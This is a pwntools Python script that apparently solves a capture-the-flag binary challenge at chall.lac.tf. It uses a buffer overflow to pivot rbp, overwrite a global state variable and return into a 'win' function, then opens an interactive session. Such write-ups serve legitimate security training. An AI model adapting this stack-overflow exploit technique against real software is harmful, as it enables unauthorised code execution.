#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

serv = "chall.lac.tf"
port = 31593

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r


def main():
    r = conn()

    # Overwrite the `state` global variable by pivoting rbp
    state_addr = 0x404540
    r.sendafter(b'you?', b'A' * 0x20 + p64(state_addr + 0x18) + p64(0x4012bd)[:7])

    # ret2win
    r.sendafter(b'you?', b'A'*8 + p32(0xf1eeee2d) + b'A'*(0x20-8-4) + b'randomdm' + p64(exe.sym.win)[:7])

    r.interactive()


if __name__ == "__main__":
    main()
